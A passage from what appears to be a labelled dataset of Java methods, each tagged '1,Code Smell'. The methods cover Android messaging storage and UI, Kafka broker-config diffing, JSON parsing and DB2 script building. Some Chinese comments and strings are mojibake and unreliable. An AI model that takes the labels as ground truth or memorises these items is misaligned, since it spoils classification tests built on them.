        Page page=(Page)views[i];
        if (page.pageType == PAGE_TYPE_SHARE) {
          page.updateItems(true);
        }
      }
    }
  }
}",1,Code Smell
"public void processUpdate(TL_stories.TL_updateStory updateStory){
  storage.getStorageQueue().postRunnable(() -> {
    SQLiteDatabase database=storage.getDatabase();
    SQLiteCursor cursor=null;
    try {
      long dialogId=DialogObject.getPeerDialogId(updateStory.peer);
      int count=0;
      int storyId=updateStory.story.id;
      boolean storyExist=false;
      if (updateStory.story instanceof TL_stories.TL_storyItemDeleted) {
        cursor=database.queryFinalized(String.format(Locale.US,""SELECT data, custom_params FROM stories WHERE dialog_id = %d AND story_id = %d"",dialogId,storyId));
        if (cursor.next()) {
          NativeByteBuffer data=cursor.byteBufferValue(0);
          NativeByteBuffer customData=cursor.byteBufferValue(1);
          if (data != null) {
            TL_stories.StoryItem storyItem=TL_stories.StoryItem.TLdeserialize(data,data.readInt32(true),true);
            StoryCustomParamsHelper.readLocalParams(storyItem,customData);
            data.reuse();
          }
          if (customData != null) {
            customData.reuse();
          }
          storyExist=true;
        }
        cursor.dispose();
        database.executeFast(String.format(Locale.US,""DELETE FROM stories WHERE dialog_id = %d AND story_id = %d"",dialogId,storyId)).stepThis().dispose();
        if (storyExist) {
          count--;
        }
      }
 else       if (updateStory.story instanceof TL_stories.TL_storyItem) {
        updateStoryItemInternal(dialogId,updateStory.story);
        cursor=database.queryFinalized(String.format(Locale.US,""SELECT story_id FROM stories WHERE dialog_id = %d AND story_id = %d"",dialogId,storyId));
        if (cursor.next()) {
          storyExist=true;
        }
        cursor.dispose();
        if (!storyExist) {
          count++;
        }
      }
      cursor=database.queryFinalized(""SELECT count, max_read FROM stories_counter WHERE dialog_id = "" + dialogId);
      int totalCount=0;
      if (cursor.next()) {
        totalCount=cursor.intValue(1);
      }
      cursor.dispose();
      cursor=null;
      database.executeFast(String.format(Locale.US,""UPDATE stories_counter SET count = %d WHERE dialog_id = %d"",totalCount + count,dialogId)).stepThis().dispose();
    }
 catch (    Throwable e) {
      storage.checkSQLException(e);
    }
  }
);
}",1,Code Smell
"@Override public TaskResult processClusterTask(ClusterPhy clusterPhy,long triggerTimeUnitMs){
  Map<String,Map<Integer,String>> allConfigMap=new HashMap<>();
  List<Broker> brokerList=brokerService.listAliveBrokersFromDB(clusterPhy.getId());
  Set<Integer> brokerIdSet=brokerList.stream().map(elem -> elem.getBrokerId()).collect(Collectors.toSet());
  for (  Integer brokerId : brokerIdSet) {
    Result<List<KafkaConfigDetail>> configResult=brokerConfigService.getBrokerConfigDetailFromKafka(clusterPhy.getId(),brokerId);
    if (configResult.failed()) {
      log.error(""method=processSubTask||clusterPhyId={}||brokerId={}||result={}||errMsg=get config failed!"",clusterPhy.getId(),brokerId,configResult);
      continue;
    }
    List<KafkaConfigDetail> configList=configResult.hasData() ? configResult.getData() : new ArrayList<>();
    configList.forEach(elem -> {
      allConfigMap.putIfAbsent(elem.getName(),new HashMap<>());
      allConfigMap.get(elem.getName()).put(brokerId,elem.getValue());
    }
);
  }
  List<BrokerConfigPO> poList=new ArrayList<>();
  for (  Map.Entry<String,Map<Integer,String>> configEntry : allConfigMap.entrySet()) {
    if (brokerIdSet.size() <= 1) {
      continue;
    }
    if (configEntry.getValue().size() == 1) {
      Integer brokerId=new ArrayList<>(configEntry.getValue().keySet()).get(0);
      poList.add(new BrokerConfigPO(clusterPhy.getId(),brokerId,configEntry.getKey(),configEntry.getValue().getOrDefault(brokerId,""""),ConfigDiffTypeEnum.ALONE_POSSESS.getCode(),new Date(triggerTimeUnitMs)));
    }
    Set<String> configValueSet=new HashSet<>(configEntry.getValue().values());
    if (configValueSet.size() <= 1) {
      continue;
    }
    configEntry.getValue().entrySet().stream().forEach(elem -> poList.add(new BrokerConfigPO(clusterPhy.getId(),elem.getKey(),configEntry.getKey(),elem.getValue(),ConfigDiffTypeEnum.UN_EQUAL.getCode(),new Date(triggerTimeUnitMs))));
  }
  for (  BrokerConfigPO po : poList) {
    try {
      brokerConfigService.replaceBrokerConfigDiff(po);
    }
 catch (    Exception e) {
      log.error(""method=processSubTask||clusterPhyId={}||data={}||errMsg=exception!"",clusterPhy.getId(),po,e);
    }
  }
  brokerConfigService.deleteByUpdateTimeBeforeInDB(clusterPhy.getId(),new Date(triggerTimeUnitMs - 10 * 60 * 1000L));
  return TaskResult.SUCCESS;
}",1,Code Smell
"private void applyForcesOnBody(ReadableMap map){
  ReadableArray torqueProp=map.hasKey(""torque"") ? map.getArray(""torque"") : null;
  boolean currentMapHasTorque=mPhysicsMap != null && mPhysicsMap.hasKey(""torque"");
  ReadableArray currentTorque=currentMapHasTorque ? mPhysicsMap.getArray(""torque"") : null;
  boolean hasTorqueChanged=torqueProp != currentTorque;
  if (torqueProp != null) {
    hasTorqueChanged=!torqueProp.equals(currentTorque);
  }
  ArrayList<ReadableMap> forcesListProp=getForcesFromReactMap(map);
  ArrayList<ReadableMap> forcesListCurrent=getForcesFromReactMap(mPhysicsMap);
  boolean hasForceChanged=!forcesListProp.equals(forcesListCurrent);
  if (!hasForceChanged && !hasTorqueChanged) {
    return;
  }
  mNodeJni.getPhysicsBody().clearForce();
  if (map.hasKey(""torque"")) {
    ReadableArray paramsArray=map.getArray(""torque"");
    float torqueArray[]=new float[paramsArray.size()];
    for (int i=0; i < paramsArray.size(); i++) {
      torqueArray[i]=(float)paramsArray.getDouble(i);
    }
    if (torqueArray.length != 3) {
      throw new JSApplicationCausedNativeException(""Incorrect parameters "" + ""provided for torque, expected: [x, y, z]!"");
    }
    mNodeJni.getPhysicsBody().applyTorque(new Vector(torqueArray));
  }
  for (  ReadableMap forceMap : forcesListProp) {
    float forceArray[];
    if (forceMap.hasKey(""value"")) {
      ReadableArray paramsArray=forceMap.getArray(""value"");
      forceArray=new float[paramsArray.size()];
      for (int i=0; i < paramsArray.size(); i++) {
        forceArray[i]=(float)paramsArray.getDouble(i);
      }
      if (forceArray.length != 3) {
        throw new JSApplicationCausedNativeException(""Incorrect parameters "" + ""provided for force's value, expected: [x, y, z]!"");
      }
    }
 else {
      throw new JSApplicationCausedNativeException(""Incorrect parameters: missing"" + "" value of format [x, y, z] for force!"");
    }
    float positionArray[];
    if (forceMap.hasKey(""position"")) {
      ReadableArray paramsArray=forceMap.getArray(""position"");
      positionArray=new float[paramsArray.size()];
      for (int i=0; i < paramsArray.size(); i++) {
        positionArray[i]=(float)paramsArray.getDouble(i);
      }
      if (positionArray.length != 3) {
        throw new JSApplicationCausedNativeException(""Incorrect parameters "" + ""provided for force's position, expected: [x, y, z]!"");
      }
    }
 else {
      positionArray=new float[]{0,0,0};
    }
    mNodeJni.getPhysicsBody().applyForce(new Vector(forceArray),new Vector(positionArray));
  }
}",1,Code Smell
"public static int[][] adjacent(int numSeats,int[][] seatLayout){
  int numRows=seatLayout.length;
  int numCols=seatLayout[0].length;
  List<int[]> selectedSeats=new ArrayList<>();
  for (int i=0; i < numRows; i++) {
    for (int j=0; j < numCols; j++) {
      if (seatLayout[i][j] == 0) {
        int consecutiveSeats=0;
        for (int k=j; k < numCols; k++) {
          if (seatLayout[i][k] == 0) {
            consecutiveSeats++;
            if (consecutiveSeats == numSeats) {
              for (int l=k - numSeats + 1; l <= k; l++) {
                selectedSeats.add(new int[]{i,l});
              }
              break;
            }
          }
 else {
            consecutiveSeats=0;
          }
        }
        if (!selectedSeats.isEmpty()) {
          break;
        }
      }
    }
    if (!selectedSeats.isEmpty()) {
      break;
    }
  }
  if (CollUtil.isEmpty(selectedSeats)) {
    return null;
  }
  int[][] actualSeat=new int[numSeats][2];
  int i=0;
  for (  int[] seat : selectedSeats) {
    int row=seat[0] + 1;
    int col=seat[1] + 1;
    actualSeat[i][0]=row;
    actualSeat[i][1]=col;
    i++;
  }
  return actualSeat;
}",1,Code Smell
"/** 
 * 瑙ｆ瀽<code>{</code>鏍囪涔嬪悗鐨勪竴涓璞°��
 * @param p
 * @return
 * @throws Throwable
 */
protected Map<String,Object> parseNextObject(JsonParser p) throws Throwable {
  Map<String,Object> map=new HashMap<>();
  String name=null;
  while (p.hasNext()) {
    Event e=p.next();
    if (Event.KEY_NAME.equals(e)) {
      name=p.getString();
    }
 else     if (Event.VALUE_FALSE.equals(e)) {
      if (name == null)       throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.KEY_NAME);
      map.put(name,false);
      name=null;
    }
 else     if (Event.VALUE_NULL.equals(e)) {
      if (name == null)       throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.KEY_NAME);
      map.put(name,null);
      name=null;
    }
 else     if (Event.VALUE_NUMBER.equals(e)) {
      if (name == null)       throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.KEY_NAME);
      map.put(name,p.getBigDecimal());
      name=null;
    }
 else     if (Event.VALUE_STRING.equals(e)) {
      if (name == null)       throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.KEY_NAME);
      map.put(name,p.getString());
      name=null;
    }
 else     if (Event.VALUE_TRUE.equals(e)) {
      if (name == null)       throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.KEY_NAME);
      map.put(name,true);
      name=null;
    }
 else     if (Event.START_OBJECT.equals(e)) {
      if (name == null)       throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.KEY_NAME);
      Object subMap=parseNextObject(p);
      map.put(name,subMap);
      name=null;
    }
 else     if (Event.END_OBJECT.equals(e)) {
      break;
    }
 else     if (Event.START_ARRAY.equals(e)) {
      if (name == null)       throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.KEY_NAME);
      Object[] subArray=parseNextArray(p);
      map.put(name,subArray);
      name=null;
    }
 else     if (Event.END_ARRAY.equals(e))     throw new IllegalJsonDataFormatException(p.getLocation(),false,Event.END_ARRAY);
  }
  return map;
}
",1,Code Smell
"/** 
 * You can call this function yourself to have the scroll view perform scrolling from a key event, just as if the event had been dispatched to it by the view hierarchy.
 * @param event The key event to execute.
 * @return Return true if the event was handled, else false.
 */
public boolean executeKeyEvent(KeyEvent event){
  mTempRect.setEmpty();
  boolean handled=false;
  if (event.getAction() == KeyEvent.ACTION_DOWN) {
switch (event.getKeyCode()) {
case KeyEvent.KEYCODE_DPAD_LEFT:
      if (canScrollH()) {
        if (!event.isAltPressed()) {
          handled=arrowScrollH(View.FOCUS_LEFT);
        }
 else {
          handled=fullScrollH(View.FOCUS_LEFT);
        }
      }
    break;
case KeyEvent.KEYCODE_DPAD_RIGHT:
  if (canScrollH()) {
    if (!event.isAltPressed()) {
      handled=arrowScrollH(View.FOCUS_RIGHT);
    }
 else {
      handled=fullScrollH(View.FOCUS_RIGHT);
    }
  }
break;
case KeyEvent.KEYCODE_DPAD_UP:
if (canScrollV()) {
if (!event.isAltPressed()) {
  handled=arrowScrollV(View.FOCUS_UP);
}
 else {
  handled=fullScrollV(View.FOCUS_UP);
}
}
break;
case KeyEvent.KEYCODE_DPAD_DOWN:
if (canScrollV()) {
if (!event.isAltPressed()) {
handled=arrowScrollV(View.FOCUS_DOWN);
}
 else {
handled=fullScrollV(View.FOCUS_DOWN);
}
}
break;
}
}
return handled;
}
",1,Code Smell
"static private int calculateScore(Keyword candidateKeyword,Keyword targetKeyword,int index){
  if (!KeywordMatch.match(candidateKeyword,targetKeyword)) {
    return -(50 + 3 * index);
  }
  int score=5 - 3 * index;
  String targetName=targetKeyword.songName.toLowerCase();
  String candidateSongName=candidateKeyword.songName.toLowerCase();
  int candidateLen=candidateSongName.length();
  int targetLen=targetName.length();
  score-=Math.abs(candidateLen - targetLen);
  String leftName=candidateSongName.replace(targetName,"""");
  List<String> words=Arrays.asList(""live"",""dj"",""remix"",""cover"",""instrumental"",""浼村"",""缈诲敱"",""缈昏嚜"");
  for (  String word : words) {
    if (KeywordMatch.match(word,leftName)) {
      if (KeywordMatch.match(word,targetKeyword.extra)) {
        score=7;
      }
 else {
        score-=2;
      }
    }
  }
  score-=Math.abs(targetKeyword.singers.size() - candidateKeyword.singers.size());
  for (  String targetSinger : targetKeyword.singers) {
    for (    String candidateSinger : candidateKeyword.singers) {
      if (KeywordMatch.match(targetSinger,candidateSinger)) {
        score+=3;
        score-=Math.abs(targetSinger.length() - candidateSinger.length());
      }
    }
  }
  return score;
}",1,Code Smell
"private static void patrolKeepGoing(String s,int nodeIndex,int patrolId){
  try {
    if (s == null) {
      s=AntForestRpcCall.patrolKeepGoing(nodeIndex,patrolId,""image"");
    }
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONArray jaEvents=jo.optJSONArray(""events"");
      if (jaEvents == null || jaEvents.length() == 0)       return;
      JSONObject userPatrol=jo.getJSONObject(""userPatrol"");
      int currentNode=userPatrol.getInt(""currentNode"");
      JSONObject events=jo.getJSONArray(""events"").getJSONObject(0);
      JSONObject rewardInfo=events.optJSONObject(""rewardInfo"");
      if (rewardInfo != null) {
        JSONObject animalProp=rewardInfo.optJSONObject(""animalProp"");
        if (animalProp != null) {
          JSONObject animal=animalProp.optJSONObject(""animal"");
          if (animal != null) {
            Log.forest(""宸℃姢妫灄馃弴馃徎["" + animal.getString(""name"") + ""纰庣墖]"");
          }
        }
      }
      if (!""GOING"".equals(jo.getString(""currentStatus"")))       return;
      JSONObject materialInfo=events.getJSONObject(""materialInfo"");
      String materialType=materialInfo.optString(""materialType"",""image"");
      String str=AntForestRpcCall.patrolKeepGoing(currentNode,patrolId,materialType);
      patrolKeepGoing(str,nodeIndex,patrolId);
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""patrolKeepGoing err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@Override public boolean onInterceptTouchEvent(MotionEvent ev){
  final int action=ev.getAction();
  if ((action == MotionEvent.ACTION_MOVE) && (mIsBeingDragged)) {
    return true;
  }
switch (action & MotionEvent.ACTION_MASK) {
case MotionEvent.ACTION_MOVE:
{
      final int activePointerId=mActivePointerId;
      if (activePointerId == INVALID_POINTER) {
        break;
      }
      final int pointerIndex=ev.findPointerIndex(activePointerId);
      final float y=ev.getY(pointerIndex);
      final int yDiff=(int)Math.abs(y - mLastMotionY);
      if (yDiff > mTouchSlop) {
        mIsBeingDragged=true;
        mLastMotionY=y;
      }
      final float x=ev.getX(pointerIndex);
      final int xDiff=(int)Math.abs(x - mLastMotionX);
      if (xDiff > mTouchSlop) {
        mIsBeingDragged=true;
        mLastMotionX=x;
      }
    }
case MotionEvent.ACTION_DOWN:
{
    final float x=ev.getX();
    final float y=ev.getY();
    if (!inChild((int)x,(int)y)) {
      mIsBeingDragged=false;
      break;
    }
    mLastMotionY=y;
    mLastMotionX=x;
    mActivePointerId=ev.getPointerId(0);
    mIsBeingDragged=!mScroller.isFinished();
  }
case MotionEvent.ACTION_CANCEL:
{
  mIsBeingDragged=false;
  mActivePointerId=INVALID_POINTER;
}
case MotionEvent.ACTION_POINTER_UP:
;
}
return mIsBeingDragged;
}",1,Code Smell
"/** 
 * Returns bitrate values for a set of tracks whose upcoming media chunk iterators and formats are given. <p>If an average bitrate can't be calculated, an estimation is calculated using average bitrate of another track and the ratio of the bitrate values defined in the formats of the two tracks.
 * @param iterators An array of {@link MediaChunkIterator}s providing information about the sequence of upcoming media chunks for each track.
 * @param formats The track formats.
 * @param maxDurationUs Maximum duration of chunks to be included in average bitrate values, inmicroseconds.
 * @param bitrates If not null, stores bitrate values in this array.
 * @return Average bitrate values for the tracks. If for a track, an average bitrate or anestimation can't be calculated,  {@link Format#NO_VALUE} is set.
 * @see #getAverageBitrate(MediaChunkIterator,long)
 */
@VisibleForTesting static int[] getBitratesUsingFutureInfo(MediaChunkIterator[] iterators,Format[] formats,long maxDurationUs,@Nullable int[] bitrates){
  int trackCount=iterators.length;
  Assertions.checkArgument(trackCount == formats.length);
  if (trackCount == 0) {
    return new int[0];
  }
  if (bitrates == null) {
    bitrates=new int[trackCount];
  }
  if (maxDurationUs == 0) {
    Arrays.fill(bitrates,Format.NO_VALUE);
    return bitrates;
  }
  int[] formatBitrates=new int[trackCount];
  float[] bitrateRatios=new float[trackCount];
  boolean needEstimateBitrate=false;
  boolean canEstimateBitrate=false;
  for (int i=0; i < trackCount; i++) {
    int bitrate=getAverageBitrate(iterators[i],maxDurationUs);
    if (bitrate != Format.NO_VALUE) {
      int formatBitrate=formats[i].bitrate;
      formatBitrates[i]=formatBitrate;
      if (formatBitrate != Format.NO_VALUE) {
        bitrateRatios[i]=((float)bitrate) / formatBitrate;
        canEstimateBitrate=true;
      }
    }
 else {
      needEstimateBitrate=true;
      formatBitrates[i]=Format.NO_VALUE;
    }
    bitrates[i]=bitrate;
  }
  if (needEstimateBitrate && canEstimateBitrate) {
    estimateBitrates(bitrates,formats,formatBitrates,bitrateRatios);
  }
  return bitrates;
}",1,Code Smell
"private void checkForMatch(ItemStack is){
  if (is != null) {
    for (    ItemMatcher matcher : this.matchers) {
      int savedCollected;
      if (params.isOnce()) {
        savedCollected=getCollectedItemCount(is);
      }
 else {
        savedCollected=getCollectedItemCount(is) % matcher.matchSpec.getAmount();
      }
      if (matcher.matches(is)) {
        if (!params.isSparse()) {
          if (savedCollected != 0 && savedCollected < matcher.matchSpec.getAmount()) {
            for (int i=savedCollected; i < matcher.matchSpec.getAmount() && i - savedCollected < is.getCount(); i++) {
              int dimension=params.getDimension();
              float adjusted_reward=this.adjustAndDistributeReward(((BlockOrItemSpecWithReward)matcher.matchSpec).getReward().floatValue(),params.getDimension(),((BlockOrItemSpecWithReward)matcher.matchSpec).getDistribution());
              addCachedReward(dimension,adjusted_reward);
            }
          }
 else           if (true || savedCollected == 0) {
            for (int i=0; i < is.getCount() && i < matcher.matchSpec.getAmount(); i++) {
              int dimension=params.getDimension();
              float adjusted_reward=this.adjustAndDistributeReward(((BlockOrItemSpecWithReward)matcher.matchSpec).getReward().floatValue(),params.getDimension(),((BlockOrItemSpecWithReward)matcher.matchSpec).getDistribution());
              addCachedReward(dimension,adjusted_reward);
            }
          }
        }
 else {
          if (savedCollected < matcher.matchSpec.getAmount() && savedCollected + is.getCount() >= matcher.matchSpec.getAmount()) {
            int dimension=params.getDimension();
            float adjusted_reward=this.adjustAndDistributeReward(((BlockOrItemSpecWithReward)matcher.matchSpec).getReward().floatValue(),params.getDimension(),((BlockOrItemSpecWithReward)matcher.matchSpec).getDistribution());
            addCachedReward(dimension,adjusted_reward);
          }
        }
      }
    }
    addCollectedItemCount(is);
  }
}",1,Code Smell
"/** 
 * judge src instance of target<br/>
 * @param src    src
 * @param target target
 * @return true if src instance of targe
 */
private boolean typeOf(final Type src,final Type target){
  if (src == target) {
    return true;
  }
  final int srcSort=src.getSort();
  final int targetSort=target.getSort();
  if (src == SLOT_TYPE) {
    if (target == DOUBLE_SLOT_TYPE) {
      return false;
    }
 else     return Type.BOOLEAN == targetSort || Type.BYTE == targetSort || Type.CHAR == targetSort || Type.SHORT == targetSort || Type.INT == targetSort || Type.FLOAT == targetSort || Type.OBJECT == targetSort || Type.ARRAY == targetSort;
  }
 else   if (src == DOUBLE_SLOT_TYPE) {
    if (target == SLOT_TYPE) {
      return false;
    }
 else     return Type.DOUBLE == targetSort || Type.LONG == targetSort;
  }
 else   if (target == SLOT_TYPE) {
    return Type.BOOLEAN == srcSort || Type.BYTE == srcSort || Type.CHAR == srcSort || Type.SHORT == srcSort || Type.INT == srcSort || Type.FLOAT == srcSort || Type.OBJECT == srcSort || Type.ARRAY == srcSort;
  }
 else   if (target == DOUBLE_SLOT_TYPE) {
    return Type.DOUBLE == srcSort || Type.LONG == srcSort;
  }
 else   if ((srcSort == Type.BOOLEAN || srcSort == Type.BYTE || srcSort == Type.CHAR || srcSort == Type.SHORT || srcSort == Type.INT) && (targetSort == Type.BOOLEAN || targetSort == Type.BYTE || targetSort == Type.CHAR || targetSort == Type.SHORT || targetSort == Type.INT)) {
    return true;
  }
 else   if (src == OBJECT_TYPE) {
    return targetSort == Type.OBJECT || targetSort == Type.ARRAY;
  }
 else   if (target == OBJECT_TYPE) {
    return srcSort == Type.OBJECT || srcSort == Type.ARRAY;
  }
 else   if (srcSort == Type.OBJECT && targetSort == Type.OBJECT) {
    return mContext.instanceofClass(src.getClassName(),target.getClassName());
  }
 else   if (srcSort == Type.OBJECT && targetSort == Type.ARRAY) {
    return false;
  }
 else   if (srcSort == Type.ARRAY && targetSort == Type.OBJECT) {
    return OBJECT_TYPE.equals(target);
  }
 else   if (srcSort == Type.ARRAY && targetSort == Type.ARRAY) {
    return typeOf(Type.getType(src.getDescriptor().substring(1)),Type.getType(target.getDescriptor().substring(1)));
  }
 else {
    return src.equals(target);
  }
}",1,Code Smell
"@Override public void onApplicationEvent(@NonNull ApplicationReadyEvent applicationReadyEvent){
  if (polarisContractProperties.isReportEnabled()) {
    try {
      AbstractOpenApiResource openApiResource=null;
      if (multipleOpenApiWebMvcResource != null) {
        openApiResource=OpenApiWebMvcUtil.getOpenApiResourceOrThrow(multipleOpenApiWebMvcResource,polarisContractProperties.getGroup());
      }
 else       if (multipleOpenApiWebFluxResource != null) {
        openApiResource=OpenApiWebFluxUtil.getOpenApiResourceOrThrow(multipleOpenApiWebFluxResource,polarisContractProperties.getGroup());
      }
      OpenAPI openAPI=null;
      if (openApiResource != null) {
        openAPI=AbstractOpenApiResourceUtil.getOpenApi(openApiResource);
      }
      if (openAPI != null) {
        ReportServiceContractRequest request=new ReportServiceContractRequest();
        String name=polarisContractProperties.getName();
        if (StringUtils.isBlank(name)) {
          name=polarisDiscoveryProperties.getService();
        }
        request.setName(name);
        request.setNamespace(polarisDiscoveryProperties.getNamespace());
        request.setService(polarisDiscoveryProperties.getService());
        request.setProtocol(""http"");
        request.setVersion(polarisDiscoveryProperties.getVersion());
        List<InterfaceDescriptor> interfaceDescriptorList=getInterfaceDescriptorFromSwagger(openAPI);
        request.setInterfaceDescriptors(interfaceDescriptorList);
        String jsonValue;
        if (springdocObjectMapperProvider != null && springdocObjectMapperProvider.jsonMapper() != null) {
          jsonValue=springdocObjectMapperProvider.jsonMapper().writeValueAsString(openAPI);
        }
 else {
          ObjectMapper mapper=new ObjectMapper();
          mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);
          jsonValue=mapper.writeValueAsString(openAPI);
        }
        String serviceApiMeta=GzipUtil.compressBase64Encode(jsonValue,""utf-8"");
        request.setContent(serviceApiMeta);
        ReportServiceContractResponse response=providerAPI.reportServiceContract(request);
        LOG.info(""Service contract [Namespace: {}. Name: {}. Service: {}. Protocol:{}. Version: {}. API counter: {}] is reported."",request.getNamespace(),request.getName(),request.getService(),request.getProtocol(),request.getVersion(),request.getInterfaceDescriptors().size());
        if (LOG.isDebugEnabled()) {
          LOG.debug(""OpenApi json data: {}"",jsonValue);
          LOG.debug(""OpenApi json base64 data: {}"",serviceApiMeta);
        }
      }
 else {
        LOG.warn(""OpenAPI or json is null, group:{}"",polarisContractProperties.getGroup());
      }
    }
 catch (    Throwable t) {
      LOG.error(""Report contract failed."",t);
    }
  }
}",1,Code Smell
"public void putBotKeyboard(MessagesStorage.TopicKey topicKey,TLRPC.Message message){
  if (topicKey == null) {
    return;
  }
  try {
    int mid=0;
    SQLiteCursor cursor;
    if (topicKey.topicId != 0) {
      cursor=getMessagesStorage().getDatabase().queryFinalized(String.format(Locale.US,""SELECT mid FROM bot_keyboard_topics WHERE uid = %d AND tid = %d"",topicKey.dialogId,topicKey.topicId));
    }
 else {
      cursor=getMessagesStorage().getDatabase().queryFinalized(String.format(Locale.US,""SELECT mid FROM bot_keyboard WHERE uid = %d"",topicKey.dialogId));
    }
    if (cursor.next()) {
      mid=cursor.intValue(0);
    }
    cursor.dispose();
    if (mid >= message.id) {
      return;
    }
    SQLitePreparedStatement state;
    if (topicKey.topicId != 0) {
      state=getMessagesStorage().getDatabase().executeFast(""REPLACE INTO bot_keyboard_topics VALUES(?, ?, ?, ?)"");
    }
 else {
      state=getMessagesStorage().getDatabase().executeFast(""REPLACE INTO bot_keyboard VALUES(?, ?, ?)"");
    }
    state.requery();
    NativeByteBuffer data=new NativeByteBuffer(message.getObjectSize());
    message.serializeToStream(data);
    if (topicKey.topicId != 0) {
      state.bindLong(1,topicKey.dialogId);
      state.bindInteger(2,topicKey.topicId);
      state.bindInteger(3,message.id);
      state.bindByteBuffer(4,data);
    }
 else {
      state.bindLong(1,topicKey.dialogId);
      state.bindInteger(2,message.id);
      state.bindByteBuffer(3,data);
    }
    state.step();
    data.reuse();
    state.dispose();
    AndroidUtilities.runOnUIThread(() -> {
      TLRPC.Message old=botKeyboards.get(topicKey);
      botKeyboards.put(topicKey,message);
      ArrayList<TLRPC.Message> messages=botDialogKeyboards.get(topicKey.dialogId);
      if (messages == null) {
        messages=new ArrayList<>();
      }
      messages.add(message);
      botDialogKeyboards.put(topicKey.dialogId,messages);
      long channelId=MessageObject.getChannelId(message);
      if (channelId == 0) {
        if (old != null) {
          botKeyboardsByMids.delete(old.id);
        }
        botKeyboardsByMids.put(message.id,topicKey);
      }
      getNotificationCenter().postNotificationName(NotificationCenter.botKeyboardDidLoad,message,topicKey);
    }
);
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}",1,Code Smell
"@Override public String buildModifyTaleSql(Table oldTable,Table newTable){
  StringBuilder script=new StringBuilder();
  if (!StringUtils.equalsIgnoreCase(oldTable.getName(),newTable.getName())) {
    script.append(""ALTER TABLE "").append(""\"""").append(oldTable.getSchemaName()).append(""\"".\"""").append(oldTable.getName()).append(""\"""");
    script.append("" "").append(""RENAME TO "").append(""\"""").append(newTable.getName()).append(""\"""").append("";\n"");
  }
  if (!StringUtils.equalsIgnoreCase(oldTable.getComment(),newTable.getComment())) {
    script.append("""").append(buildTableComment(newTable)).append("";\n"");
  }
  for (  TableColumn tableColumn : newTable.getColumnList()) {
    if (StringUtils.isNotBlank(tableColumn.getEditStatus())) {
      DB2ColumnTypeEnum typeEnum=DB2ColumnTypeEnum.getByType(tableColumn.getColumnType());
      script.append(""\t"").append(typeEnum.buildModifyColumn(tableColumn)).append("";\n"");
      if (StringUtils.isNotBlank(tableColumn.getComment())) {
        script.append(""\n"").append(buildComment(tableColumn)).append("";\n"");
      }
    }
  }
  for (  TableIndex tableIndex : newTable.getIndexList()) {
    if (StringUtils.isNotBlank(tableIndex.getEditStatus()) && StringUtils.isNotBlank(tableIndex.getType())) {
      DB2IndexTypeEnum mysqlIndexTypeEnum=DB2IndexTypeEnum.getByType(tableIndex.getType());
      script.append(""\t"").append(mysqlIndexTypeEnum.buildModifyIndex(tableIndex)).append("";\n"");
      if (StringUtils.isNotBlank(tableIndex.getComment())) {
        script.append(""\n"").append(mysqlIndexTypeEnum.buildIndexComment(tableIndex)).append("";\n"");
      }
    }
  }
  if (script.length() > 2) {
    script=new StringBuilder(script.substring(0,script.length() - 2));
    script.append("";"");
  }
  return script.toString();
}",1,Code Smell
"private void updateFieldRight(int attachVisible){
  if (messageEditText == null || editingMessageObject != null) {
    return;
  }
  FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)messageEditText.getLayoutParams();
  int oldRightMargin=layoutParams.rightMargin;
  if (attachVisible == 1) {
    if (botButton != null && botButton.getVisibility() == VISIBLE && scheduledButton != null && scheduledButton.getVisibility() == VISIBLE && attachLayout != null && attachLayout.getVisibility() == VISIBLE) {
      layoutParams.rightMargin=dp(146);
    }
 else     if (botButton != null && botButton.getVisibility() == VISIBLE || notifyButton != null && notifyButton.getVisibility() == VISIBLE || scheduledButton != null && scheduledButton.getTag() != null) {
      layoutParams.rightMargin=dp(98);
    }
 else {
      layoutParams.rightMargin=dp(50);
    }
  }
 else   if (attachVisible == 2) {
    if (layoutParams.rightMargin != dp(2)) {
      if (botButton != null && botButton.getVisibility() == VISIBLE && scheduledButton != null && scheduledButton.getVisibility() == VISIBLE && attachLayout != null && attachLayout.getVisibility() == VISIBLE) {
        layoutParams.rightMargin=dp(146);
      }
 else       if (botButton != null && botButton.getVisibility() == VISIBLE || notifyButton != null && notifyButton.getVisibility() == VISIBLE || scheduledButton != null && scheduledButton.getTag() != null) {
        layoutParams.rightMargin=dp(98);
      }
 else {
        layoutParams.rightMargin=dp(50);
      }
    }
  }
 else {
    if (scheduledButton != null && scheduledButton.getTag() != null) {
      layoutParams.rightMargin=dp(50);
    }
 else {
      layoutParams.rightMargin=dp(2);
    }
  }
  if (oldRightMargin != layoutParams.rightMargin) {
    messageEditText.setLayoutParams(layoutParams);
  }
}",1,Code Smell
"private void savePeerSettings(long dialogId,TLRPC.PeerSettings settings,boolean update){
  if (settings == null) {
    return;
  }
  SharedPreferences.Editor editor=notificationsPreferences.edit();
  if (settings.business_bot_id != 0) {
    editor.putLong(""dialog_botid"" + dialogId,settings.business_bot_id);
    editor.putString(""dialog_boturl"" + dialogId,settings.business_bot_manage_url);
    editor.putInt(""dialog_botflags"" + dialogId,(settings.business_bot_paused ? 1 : 0) + (settings.business_bot_can_reply ? 2 : 0));
  }
 else {
    editor.remove(""dialog_botid"" + dialogId).remove(""dialog_boturl"" + dialogId).remove(""dialog_botflags"" + dialogId);
  }
  if (notificationsPreferences.getInt(""dialog_bar_vis3"" + dialogId,0) == 3) {
    editor.apply();
    getNotificationCenter().postNotificationName(NotificationCenter.peerSettingsDidLoad,dialogId);
    return;
  }
  boolean bar_hidden=settings.flags == 0;
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""peer settings loaded for "" + dialogId + "" add = ""+ settings.add_contact+ "" block = ""+ settings.block_contact+ "" spam = ""+ settings.report_spam+ "" share = ""+ settings.share_contact+ "" geo = ""+ settings.report_geo+ "" hide = ""+ bar_hidden+ "" distance = ""+ settings.geo_distance+ "" invite = ""+ settings.invite_members);
  }
